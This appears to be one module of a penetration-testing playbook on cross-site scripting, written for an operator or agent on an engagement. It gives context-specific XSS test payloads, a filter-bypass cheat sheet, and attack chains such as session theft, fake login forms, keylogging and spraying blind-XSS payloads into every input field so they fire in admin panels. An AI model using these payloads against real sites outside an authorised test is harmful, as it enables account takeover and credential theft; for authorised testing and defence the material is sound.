# Web And API Operations: Attack Primitives: Traditional Web Vulnerabilities: Cross-Site Scripting (XSS) — Practical Operator View

> Apply [../module-continuity.md](../module-continuity.md). Keep the same engagement and parent path as the calling route. Load this scene only when current evidence supports its prerequisites.

### Cross-Site Scripting (XSS) — Practical Operator View

**The only XSS that matters is the one with security impact.** Don't report `alert(1)` unless it proves a real attack chain.

#### Context-Based Test Payloads

| Context | Test Payload | Goal |
|---|---|---|
| HTML tag body | `<img src=x onerror=alert(1)>` | Confirm basic HTML injection |
| Within existing HTML attribute | `" onfocus=alert(1) autofocus="` | Break out of attribute value |
| Within `<script>` tag | `'; alert(1);//` | Break out of JS string |
| Within JS event handler | `');alert(1);//` | Close the event handler |
| Within URL/href | `javascript:alert(1)` | JS protocol handler |
| Within CSS | `</style><img src=x onerror=alert(1)>` | Break out of style context |
| Within Angular/React/Vue | `{{constructor.constructor('alert(1)')()}}` (Angular), `dangerouslySetInnerHTML` check | Template injection |
| DOM-based (no server reflection) | Check JS for `innerHTML`, `document.write`, `eval`, `location.*` sinks | DOM XSS |

#### Filter Bypass Quick Reference

```
Basic tag blocked → <img>, <svg>, <body>, <details>, <video>, <audio>, <marquee>, <object>, <embed>, <iframe>
on* blocked → onerror, onload, onfocus, onmouseover, ontoggle, onanimationstart, onafterscriptexecute
< blocked → use HTML entity in attribute: &#x3C;img src=x onerror=alert(1)>
() blocked → use backticks: alert`1`; or: (alert)(1)
. blocked → use with: with(document)alert(cookie)
`alert` blocked → `prompt(1)`, `confirm(1)`, `(alert)(1)`, `window['alert'](1)`
<> filtered → use DOM: javascript:alert(1) in URL context
```

#### When XSS Matters — Impact Classification

| XSS Type | Real Attack Chain |
|---|---|
| **Stored XSS** (persistent, multi-user) | Steal admin session → CSRF-protected admin actions, deface, credential harvesting via fake login form, keylogging on target page, crypto mining on internal dashboards |
| **Reflected XSS** (single-target, requires link) | Phishing chain: send link → session theft → account takeover, or: chain with CSRF for one-click attack |
| **DOM XSS** (client-side, no server logging) | Often missed by scanners; greps JS source for `innerHTML`, `document.write()`, `eval()`, `location.href` patterns |
| **Blind XSS** (fires in admin panel/backend) | Use XSS Hunter / bXSS / custom callback to catch when payload fires — these are the most valuable XSS findings (admin/staff context) |
| **Self-XSS** (only affects yourself) | Report only if chainable: self-XSS + CSRF = one-click compromise of other users |

**Blind XSS is the most under-tested vector**: Submit XSS payloads in every text field (name, address, feedback, support ticket, profile fields, user-agent in login requests, file names on upload). Admins will eventually view these in their management panel — and that's where the payload fires.


## Scene Exit

Return result classification, evidence, changed assumptions, affected paths, persistent changes, and the next parent-path decision.
